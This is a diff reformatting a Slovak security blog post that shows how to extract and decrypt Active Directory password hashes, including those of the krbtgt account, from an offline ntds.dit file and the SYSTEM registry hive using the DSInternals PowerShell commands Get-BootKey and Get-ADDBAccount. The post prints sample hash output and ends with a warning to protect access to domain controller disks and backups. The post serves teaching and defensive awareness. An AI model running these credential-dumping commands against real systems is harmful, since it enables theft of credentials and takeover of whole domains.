@@ -5,27 +5,28 @@ date: 2015-08-15T21:29:37+00:00
 layout: post
 lang: sk
 permalink: /sk/vykradanie-hesiel-zo-zalohy-active-directory/
+tags:
+    - 'Active Directory'
+    - PowerShell
+    - Security
 ---
-<p style="text-align: justify;">
-  Nedávno som písal o&nbsp;príkaze <a href="https://www.dsinternals.com/sk/vykradanie-hesiel-z-active-directory-na-dialku/">Get-ADReplAccount</a>, pomocou ktorého je&nbsp;možné vzdialene vytiahnuť heslá a&nbsp;iné citlivé informácie z doménového kontroléru. Tieto dáta sú na&nbsp;každom doménovom kontroléri uložené v&nbsp;súbore <strong>ndts.dit</strong> a&nbsp;odtiaľ sa&nbsp;dajú získať aj&nbsp;napriamo. Dokáže to&nbsp;napríklad nástroj <a href="http://www.ntdsxtract.com/">NTDSXtact</a>, ale&nbsp;ten je&nbsp;určený pre&nbsp;Linux, nemá moc jednoduché ovládanie a&nbsp;na&nbsp;väčších databázach je&nbsp;dosť pomalý. Preto som do svojho <a href="https://www.dsinternals.com/sk/na-stiahnutie/">PowerShell modulu DSInternals</a> pridal príkaz <strong>Get-ADDBAccount</strong>, ktorého použitie je&nbsp;hračka:
-</p>
 
-{% highlight powershell %}
-# Z&nbsp;registrov najprv získame tzv. Boot Key, ktorým sú heslá zašifrované:
+Nedávno som písal o príkaze [Get-ADReplAccount](https://www.dsinternals.com/sk/vykradanie-hesiel-z-active-directory-na-dialku/), pomocou ktorého je možné vzdialene vytiahnuť heslá a iné citlivé informácie z doménového kontroléru. Tieto dáta sú na každom doménovom kontroléri uložené v súbore **ndts.dit** a odtiaľ sa dajú získať aj napriamo. Dokáže to napríklad nástroj [NTDSXtact](https://github.com/csababarta/ntdsxtract), ale ten je určený pre Linux, nemá moc jednoduché ovládanie a na väčších databázach je dosť pomalý. Preto som do svojho [PowerShell modulu DSInternals](https://www.dsinternals.com/sk/na-stiahnutie/) pridal príkaz **Get-ADDBAccount**, ktorého použitie je hračka:
+
+```powershell
+# Z registrov najprv získame tzv. Boot Key, ktorým sú heslá zašifrované:
 $key = Get-BootKey -SystemHivePath 'C:\IFM\registry\SYSTEM'
 
-# Načítame databázu a&nbsp;dešifrujeme heslá všetkých používateľov:
+# Načítame databázu a dešifrujeme heslá všetkých používateľov:
 Get-ADDBAccount -All -DBPath 'C:\IFM\Active Directory\ntds.dit' -BootKey $key 
 
-# Môžeme vytiahnuť aj&nbsp;heslo konkrétneho účtu, na&nbsp;základe distinguishedName, objectGuid, objectSid či&nbsp;sAMAccountName:
+# Môžeme vytiahnuť aj heslo konkrétneho účtu, na základe distinguishedName, objectGuid, objectSid či sAMAccountName:
 Get-ADDBAccount -DistinguishedName 'CN=krbtgt,CN=Users,DC=Adatum,DC=com' -DBPath 'C:\IFM\Active Directory\ntds.dit' -BootKey $key 
-{% endhighlight powershell %}
+```
 
-<p style="text-align: justify;">
-  Výstup vyzerá úplne rovnako ako v&nbsp;prípade príkazu <a href="https://www.dsinternals.com/sk/vykradanie-hesiel-z-active-directory-na-dialku/">Get-ADReplAccount</a>:
-</p>
+Výstup vyzerá úplne rovnako ako v prípade príkazu [Get-ADReplAccount](https://www.dsinternals.com/sk/vykradanie-hesiel-z-active-directory-na-dialku/):
 
-{% highlight powershell %}
+```
 DistinguishedName: CN=krbtgt,CN=Users,DC=Adatum,DC=com
 Sid: S-1-5-21-3180365339-800773672-3767752645-502
 Guid: f58947a0-094b-4ae0-9c6a-a435c7d8eddb
@@ -116,8 +117,6 @@ SupplementalCredentials:
     Hash 27: d657b31bfcacb37443630759cc3a19bf
     Hash 28: 5d49708350e04b16ddc980a0c33c409b
     Hash 29: efe601100b7b4007fe3fa778499d5dda
-{% endhighlight %}
+```
 
-<p style="text-align: justify;">
-  Získané hashe hesiel sa&nbsp;dajú pomerne jednoducho využiť k&nbsp;ovládnutiu celého Active Directory forestu. Preto si&nbsp;dajte dobrý pozor na&nbsp;to, kto všetko má fyzický prístup k&nbsp;pevným diskom doménových kontrolérov, ich zálohám a&nbsp;v&nbsp;neposledom rade k&nbsp;VHD/VHDX/VMDK obrazom.
-</p>
+Získané hashe hesiel sa&nbsp;dajú pomerne jednoducho využiť k&nbsp;ovládnutiu celého Active Directory forestu. Preto si&nbsp;dajte dobrý pozor na&nbsp;to,&nbsp;kto všetko má fyzický prístup k&nbsp;pevným diskom doménových kontrolérov, ich zálohám a&nbsp;v&nbsp;neposledom rade k&nbsp;VHD/VHDX/VMDK obrazom.
